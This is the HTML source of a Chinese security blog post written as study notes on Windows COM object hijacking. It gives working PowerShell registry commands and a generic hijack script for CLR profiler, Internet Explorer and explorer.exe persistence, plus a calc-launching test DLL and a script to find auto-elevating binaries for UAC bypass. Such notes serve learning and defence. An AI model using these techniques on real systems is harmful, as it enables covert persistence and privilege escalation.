@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="粗浅记录，仅做笔记使用">
+<meta property="og:type" content="article">
+<meta property="og:title" content="各类COM组件劫持实例学习到Bypass UAC">
+<meta property="og:url" content="http://yoursite.com/2021/12/25/%E5%90%84%E7%B1%BBCOM%E7%BB%84%E4%BB%B6%E5%8A%AB%E6%8C%81%E5%AE%9E%E4%BE%8B%E5%AD%A6%E4%B9%A0%E5%88%B0Bypass%20UAC/index.html">
+<meta property="og:site_name" content="Bu1&#39;Blog">
+<meta property="og:description" content="粗浅记录，仅做笔记使用">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2021-12-25T10:51:07.000Z">
+<meta property="article:modified_time" content="2021-12-25T10:54:00.517Z">
+<meta property="article:author" content="Bu1">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://yoursite.com/2021/12/25/%E5%90%84%E7%B1%BBCOM%E7%BB%84%E4%BB%B6%E5%8A%AB%E6%8C%81%E5%AE%9E%E4%BE%8B%E5%AD%A6%E4%B9%A0%E5%88%B0Bypass%20UAC/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>各类COM组件劫持实例学习到Bypass UAC | Bu1'Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Bu1'Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">如果能控制粗鄙的狂喜，就不会有深入骨髓的悲伤。</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/12/25/%E5%90%84%E7%B1%BBCOM%E7%BB%84%E4%BB%B6%E5%8A%AB%E6%8C%81%E5%AE%9E%E4%BE%8B%E5%AD%A6%E4%B9%A0%E5%88%B0Bypass%20UAC/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Bu1">
+      <meta itemprop="description" content="最为惊艳的是思想碰撞产生的火花。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Bu1'Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          各类COM组件劫持实例学习到Bypass UAC
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-12-25 18:51:07 / 修改时间：18:54:00" itemprop="dateCreated datePublished" datetime="2021-12-25T18:51:07+08:00">2021-12-25</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Windows%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">Windows安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>粗浅记录，仅做笔记使用</p>
+<span id="more"></span>
+
+<h2 id="0x01-通过CLR劫持Terminal"><a href="#0x01-通过CLR劫持Terminal" class="headerlink" title="0x01 通过CLR劫持Terminal"></a>0x01 通过CLR劫持Terminal</h2><p>CLR是<code>.NET Framework</code>的主要执行引擎，全称为<code>Common Language Runtime</code>。系统启动时会自动调用<code>.net程序</code>，加载CLR，从而触发设置后门好的后门，所以可以通过CLR劫持可以实现后门驻留。</p>
+<p>新建一个不重复的CLSID节点</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-Item</span> <span class="literal">-Type</span> Directory <span class="string">&quot;HKCU:\software\classes\CLSID\&#123;12345678-1234-1234-1234-123456789012&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>在节点下新建子健InProcServer32，默认值指向需要执行的DLL，这里以弹一个计算器为例。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-Item</span> <span class="literal">-ItemType</span> String <span class="string">&quot;HKCU:\software\classes\CLSID\&#123;12345678-1234-1234-1234-123456789012&#125;\InProcServer32&quot;</span> <span class="literal">-value</span> <span class="string">&quot;C:\tmp\test.dll&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>标记DLL的线程模型，这里一般设置为Apartment</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-ItemProperty</span> <span class="literal">-Path</span> <span class="string">&quot;HKCU:\software\classes\CLSID\&#123;12345678-1234-1234-1234-123456789012&#125;\InProcServer32&quot;</span> <span class="literal">-Name</span> <span class="string">&quot;ThreadingModel&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;Apartment&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>以上命令执行完毕后可以看到注册表中成功写入了一个CLSID节点</p>
+<p>![image-20211123171535628](各类COM组件劫持实例学习到Bypass UAC/image-20211123171535628.png)</p>
+<p>这里通过设置环境变量来在当前CMD(这里用的是Terminal中的cmd)实现CLR劫持</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SETX COR_ENABLE_PROFILING 1</span><br><span class="line">SETX COR_PROFILER &#123;12345678-1234-1234-1234-123456789012&#125;</span><br></pre></td></tr></table></figure>
+
+<p>![image-20211123172526171](各类COM组件劫持实例学习到Bypass UAC/image-20211123172526171.png)</p>
+<blockquote>
+<p>这几条命令的意思是设置用户环境变量，通过在我的电脑中</p>
+</blockquote>
+<p>环境设置完毕后此时的Terminal调用<code>.net</code>程序时会加载恶意的CISID中设置的DLL，这里启动一个powershell作为测试。</p>
+<p>![image-20211124140640317](各类COM组件劫持实例学习到Bypass UAC/image-20211124140640317.png)</p>
+<p>通过上图可以发现在启动powershell的时候自动调用了设置的dll实现了对powershell的劫持，在目标对象使用powershell的时候就会触发后门。如果要实现全局CLR劫持可以考虑将相应的环境变量写入系统变量中。</p>
+<blockquote>
+<p>如果在计算机级别设置变量，它们将应用于在该计算机上启动的所有应用程序。 在该计算机上打开的“命令提示符”窗口将具有这些环境设置，从该窗口中启动的任何应用程序也将如此。 这表示该计算机上的每个托管进程都将通过你的探查器启动。 <strong>若要</strong> 在计算机级别设置环境变量，请右键单击”我的电脑”，单击”属性”，单击”高级”选项卡，单击”环境变量”，将变量添加到”系统 <strong>变量</strong>“列表，然后重启计算机。 重启后，变量将在系统范围内可用。</p>
+<p>源自<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/dotnet/framework/unmanaged-api/profiling/setting-up-a-profiling-environment">官方手册</a>。</p>
+</blockquote>
+<p>严格意义上来说CLR劫持并不是COM组件劫持的一种，因为CLR劫持也是通过CLSID实现，所以就放一起了。</p>
+<h2 id="0x02-通过CAccPropServicesClass劫持IE"><a href="#0x02-通过CAccPropServicesClass劫持IE" class="headerlink" title="0x02 通过CAccPropServicesClass劫持IE"></a>0x02 通过CAccPropServicesClass劫持IE</h2><p>现在IE用的比较少，但是通过IE启动需要执行的dll可以绕过Autoruns对启动项的检测。同时该方法也曾被木马COMpfun使用。</p>
+<p>首先明确一下IE启动时的调用顺序：</p>
+<ol>
+<li>查看CAccPropServicesClass的CLSID键{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}</li>
+<li>读取键下的子健InprocServer32</li>
+<li>读取子健的值%APPDATA%\Microsoft\Installer{BCDE0395-E52F-467C-8E3D-C4579291692E}..</li>
+</ol>
+<blockquote>
+<p>{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}对应CAccPropServicesClass</p>
+<p>{BCDE0395-E52F-467C-8E3D-C4579291692E}对应MMDeviceEnumerator</p>
+</blockquote>
+<p>一个问题，是否可以直接将default的值改为任意的dll路径。</p>
+<p>测试：</p>
+<p>首先新建一个CAccPropServicesClass的健{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-Item</span> <span class="literal">-Type</span> Directory <span class="string">&quot;HKCU:\SOFTWARE\Classes\CLSID\&#123;b5f8350b-0548-48b1-a6ee-88bd00b4a5e7&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>在这个键下面新建一个子健InprocServer32，并将default值设置恶意dll路径</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-Item</span> <span class="literal">-Type</span> String <span class="string">&quot;HKCU:\SOFTWARE\Classes\CLSID\&#123;b5f8350b-0548-48b1-a6ee-88bd00b4a5e7&#125;\InProcServer32&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;C:\tmp\test.dll&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>在子键中添加键值对<code>ThreadingModel REG_SZ Apartment</code></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-ItemProperty</span> <span class="string">&quot;HKCU:\SOFTWARE\Classes\CLSID\&#123;b5f8350b-0548-48b1-a6ee-88bd00b4a5e7&#125;\InProcServer32&quot;</span><span class="literal">-Name</span> <span class="string">&quot;ThreadingModel&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;Apartment&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>注册表中：</p>
+<p>![image-20211130173422589](各类COM组件劫持实例学习到Bypass UAC/image-20211130173422589.png)</p>
+<p>启动IE测试：</p>
+<p>![image-20211130173743281](各类COM组件劫持实例学习到Bypass UAC/image-20211130173743281.png)</p>
+<p><strong>注：</strong>测试的dll必须加互斥规则，不然无限次调用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">参考3gstudent</span><br><span class="line">#pragma comment(linker,&quot;/OPT:nowin98&quot;)</span><br><span class="line">BOOL TestMutex()</span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hMutex = CreateMutex(NULL, false, &quot;myself&quot;);  </span><br><span class="line">	if (GetLastError() == ERROR_ALREADY_EXISTS)</span><br><span class="line">	&#123;</span><br><span class="line">		CloseHandle(hMutex);</span><br><span class="line">		return 0;  </span><br><span class="line">	&#125;</span><br><span class="line">	return 1;</span><br><span class="line">&#125;</span><br><span class="line">BOOL APIENTRY DllMain( HANDLE hModule, </span><br><span class="line">                       DWORD  ul_reason_for_call, </span><br><span class="line">                       LPVOID lpReserved</span><br><span class="line">					 )</span><br><span class="line">&#123;</span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">	&#123;</span><br><span class="line">		case DLL_PROCESS_ATTACH:</span><br><span class="line">			if(TestMutex()==0)</span><br><span class="line">				return TRUE;</span><br><span class="line">			WinExec(&quot;calc.exe&quot;,SW_SHOWNORMAL);</span><br><span class="line">		case DLL_THREAD_ATTACH:</span><br><span class="line">		case DLL_THREAD_DETACH:</span><br><span class="line">		case DLL_PROCESS_DETACH:</span><br><span class="line">			break;</span><br><span class="line">    &#125;return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过测试说明其实直接劫持掉CAccPropServicesClass的健{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}也是可以达到劫持目的。</p>
+<p>完整劫持测试：劫持CAccPropServicesClass和MMDeviceEnumerator，Windows是64位的。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建文件夹</span></span><br><span class="line"><span class="built_in">New-Item</span> <span class="literal">-Path</span> <span class="string">&quot;<span class="variable">$env:APPDATA</span>\Microsoft\Installer\&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;&quot;</span> <span class="literal">-Type</span> Directory | <span class="built_in">Out-Null</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入测试dll</span></span><br><span class="line"><span class="variable">$calc_x64</span> = <span class="string">&quot;..&quot;</span> <span class="comment">#太长了，直接从下方链接拿</span></span><br><span class="line"><span class="variable">$fileContentBytes</span> = [<span class="type">System.Convert</span>]::FromBase64String(<span class="variable">$calc_x64</span>) </span><br><span class="line">[<span class="type">System.IO.File</span>]::WriteAllBytes(<span class="variable">$env:APPDATA</span>+<span class="string">&quot;\Microsoft\Installer\&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;\api-ms-win-downlevel-1x64-l1-1-0._dl&quot;</span>,<span class="variable">$fileContentBytes</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建CAccPropServicesClass的CLSID，default值指向MMDeviceEnumerator存储路径</span></span><br><span class="line"><span class="built_in">New-Item</span> <span class="string">&quot;HKCU:\SOFTWARE\Classes\CLSID\&#123;b5f8350b-0548-48b1-a6ee-88bd00b4a5e7&#125;\InProcServer32&quot;</span> <span class="literal">-value</span> <span class="string">&quot;<span class="variable">$env:APPDATA</span>\Microsoft\Installer\&#123;BCDE0395-E52F-467C-8E3D-C4579291692E&#125;\api-ms-win-downlevel-1x64-l1-1-0._dl&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建键值对ThreadingModel REG_SZ Apartment</span></span><br><span class="line"><span class="built_in">New-ItemProperty</span> <span class="string">&quot;HKCU:\SOFTWARE\Classes\CLSID\&#123;b5f8350b-0548-48b1-a6ee-88bd00b4a5e7&#125;\InProcServer32&quot;</span><span class="literal">-Name</span> <span class="string">&quot;ThreadingModel&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;Apartment&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>部分代码来自3gstudent，这里的exe转base64再加载执行需要好好学习下</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/3gstudent/COM-Object-hijacking/blob/master/COM%20Object%20hijacking%20persistence.ps1">https://github.com/3gstudent/COM-Object-hijacking/blob/master/COM%20Object%20hijacking%20persistence.ps1</a></p>
+</blockquote>
+<p>启动IE测试</p>
+<p>![image-20211130194808673](各类COM组件劫持实例学习到Bypass UAC/image-20211130194808673.png)</p>
+<h2 id="0x03-通过MruPidlList劫持explorer-exe"><a href="#0x03-通过MruPidlList劫持explorer-exe" class="headerlink" title="0x03 通过MruPidlList劫持explorer.exe"></a>0x03 通过MruPidlList劫持explorer.exe</h2><p>系统启动时会默认启动<code>explorer.exe</code>，所以如果可以劫持<code>explorer.exe</code>可以起到一个主动后门的作用。<code>explorer.exe</code>会调用shell32.dll，并且加载com对象MruPidlList。MruPidlList对应的CLSID为{42aedc87-2188-41fd-b9a3-0c966feabec1}。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\comHijack.ps1 <span class="string">&quot;&#123;42aedc87-2188-41fd-b9a3-0c966feabec1&#125;&quot;</span> <span class="string">&quot;C:\tmp\msg.dll&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>![image-20211201112221119](各类COM组件劫持实例学习到Bypass UAC/image-20211201112221119.png)</p>
+<p>此时在注册表中：</p>
+<p>![image-20211201112153985](各类COM组件劫持实例学习到Bypass UAC/image-20211201112153985.png)</p>
+<p>重启explorer.exe测试效果</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Start-Process</span> explorer.exe</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>血的教训，虚拟机里面测试！！！</p>
+</blockquote>
+<h2 id="0x04-通过TreatAS子键劫持家庭网络配置管理器"><a href="#0x04-通过TreatAS子键劫持家庭网络配置管理器" class="headerlink" title="0x04 通过TreatAS子键劫持家庭网络配置管理器"></a>0x04 通过TreatAS子键劫持家庭网络配置管理器</h2><p>这种方法在2020年被APT-C-06组织利用过。通过在家庭网络配置管理器CLSID键上添加TreatAS子键实现劫持跳转到恶意的CLSID节点。这样当系统引用家庭网络配置管理器的CLSID时就会链接到新的CLSID上，从而加载恶意文件，达到COM劫持的目的。</p>
+<p>详细的利用过程可以看之前写的<a target="_blank" rel="noopener" href="https://bu1.github.io/2021/11/27/COM%E7%BB%84%E4%BB%B6%E5%8A%AB%E6%8C%81%E5%AD%A6%E4%B9%A0%EF%BC%9A%E4%BB%8E%E5%88%9D%E8%AF%86%E5%88%B0%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/">COM组件劫持学习：从初识到简单利用</a>。</p>
+<h2 id="0x05-Bypass-UAC"><a href="#0x05-Bypass-UAC" class="headerlink" title="0x05 Bypass UAC"></a>0x05 Bypass UAC</h2><ul>
+<li><p>WIN 7</p>
+<p><code>eventvwr.exe</code>将会自动提升权限至管理员。在它启动的时候将会寻找<code>&#123;0A29FF9E-7F9C-4437-8B11-F424491E3931&#125;</code>这个组件，按照上述描述的方法可以让<code>eventvwr.exe</code>来加载指定的dll来获取管理员权限。</p>
+<blockquote>
+<p>也是msf的bypassuac_comhijack模块的实现原理</p>
+</blockquote>
+</li>
+<li><p>WIN 10</p>
+<p><code>fodhelper.exe</code>理论上也是可行的。</p>
+</li>
+</ul>
+<p>通过脚本查找更多可以利用程序</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Usage: findelevate.py C:\Windows\System32\</span></span><br><span class="line"><span class="comment"># Needs sigcheck.exe in path [https://technet.microsoft.com/en-us/sysinternals/bb897441.aspx]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> glob</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;Usage: findelevate.py &lt;PATH&gt;&quot;</span></span><br><span class="line">	<span class="built_in">print</span> <span class="string">&quot;Ex: Usage: findelevate.py C:\\Windows\\System32\\&quot;</span></span><br><span class="line">	sys.exit()</span><br><span class="line">	</span><br><span class="line">d = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> (d.endswith(<span class="string">&#x27;\\&#x27;</span>)):</span><br><span class="line">	d = d+<span class="string">&#x27;\\&#x27;</span></span><br><span class="line"></span><br><span class="line">exefiles = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.path.isdir(d):</span><br><span class="line">	exefiles =  glob.glob(d+<span class="string">&#x27;*.exe&#x27;</span>)</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> exe <span class="keyword">in</span> exefiles:</span><br><span class="line">	p = subprocess.Popen([<span class="string">&#x27;sigcheck&#x27;</span>, <span class="string">&#x27;-nobanner&#x27;</span>,<span class="string">&#x27;-m&#x27;</span>, exe],stdout=subprocess.PIPE,stderr=subprocess.PIPE)</span><br><span class="line">	out, err = p.communicate()</span><br><span class="line">	<span class="keyword">if</span> <span class="string">&#x27;true&lt;/autoElevate&gt;&#x27;</span> <span class="keyword">in</span> out: <span class="comment">#will check for xmlns autoelevate as well. Thanks @mynameisv_</span></span><br><span class="line">		<span class="built_in">print</span> exe.strip()</span><br><span class="line">		i = i + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Found &quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot; executables with autoElevate set to true!&quot;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>引用自：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/heycomputer/articles/10263579.html">https://www.cnblogs.com/heycomputer/articles/10263579.html</a></p>
+</blockquote>
+<h2 id="附：通用的劫持脚本"><a href="#附：通用的劫持脚本" class="headerlink" title="附：通用的劫持脚本"></a>附：通用的劫持脚本</h2><p>默认修改的是<code>HKCU</code></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;#    </span></span><br><span class="line"><span class="comment"><span class="doctag">.EXAMPLE</span></span></span><br><span class="line"><span class="comment">    ./comHijack.ps1 -CLSID &quot;&#123;42aedc87-2188-41fd-b9a3-0c966feabec1&#125;&quot; -dll &quot;C:\tmp\test.dll&quot;</span></span><br><span class="line"><span class="comment">#&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function">[<span class="type">CmdletBinding</span>()]</span></span><br><span class="line"><span class="keyword">param</span>(</span><br><span class="line">    [<span class="type">Parameter</span>(<span class="type">Mandatory</span> = <span class="variable">$False</span>,<span class="type">Position</span>=<span class="number">2</span>)]</span><br><span class="line">    [<span class="built_in">String</span>]<span class="variable">$key</span>=<span class="string">&quot;HKCU:&quot;</span>,</span><br><span class="line"></span><br><span class="line">    [<span class="type">Parameter</span>(<span class="type">Mandatory</span> = <span class="variable">$True</span>,<span class="type">Position</span>=<span class="number">0</span>)]</span><br><span class="line">    [<span class="built_in">String</span>]<span class="variable">$CLSID</span>,</span><br><span class="line">    </span><br><span class="line">    [<span class="type">Parameter</span>(<span class="type">Mandatory</span> = <span class="variable">$True</span>,<span class="type">Position</span>=<span class="number">1</span>)]</span><br><span class="line">    [<span class="built_in">String</span>]<span class="variable">$Dll</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span> = <span class="string">&quot;<span class="variable">$key</span>\SOFTWARE\Classes\CLSID\<span class="variable">$CLSID</span>&quot;</span></span><br><span class="line"><span class="comment"># 新建键</span></span><br><span class="line"><span class="built_in">New-Item</span> <span class="literal">-Path</span> <span class="variable">$key</span> <span class="literal">-Type</span> Directory | <span class="built_in">Out-Null</span></span><br><span class="line"><span class="comment"># 新建子键</span></span><br><span class="line"><span class="built_in">New-Item</span> <span class="literal">-Path</span>  <span class="string">&quot;<span class="variable">$key</span>\InProcServer32&quot;</span> <span class="literal">-Type</span> String <span class="literal">-Value</span> <span class="string">&quot;<span class="variable">$Dll</span>&quot;</span> | <span class="built_in">Out-Null</span></span><br><span class="line"><span class="comment"># 新建键值对</span></span><br><span class="line"><span class="built_in">New-ItemProperty</span> <span class="string">&quot;<span class="variable">$key</span>\InProcServer32&quot;</span> <span class="literal">-Name</span> <span class="string">&quot;ThreadingModel&quot;</span> <span class="literal">-Value</span> <span class="string">&quot;Apartment&quot;</span> | <span class="built_in">Out-Null</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;success!&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/12/25/Typora%E5%AE%9E%E7%8E%B0%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84%E8%87%AA%E5%AE%9A%E4%B9%89%E8%B7%B3%E8%BD%AC/" rel="prev" title="Typora实现目录结构自定义跳转">
+      <i class="fa fa-chevron-left"></i> Typora实现目录结构自定义跳转
+    </a></div>
+      <div class="post-nav-item">
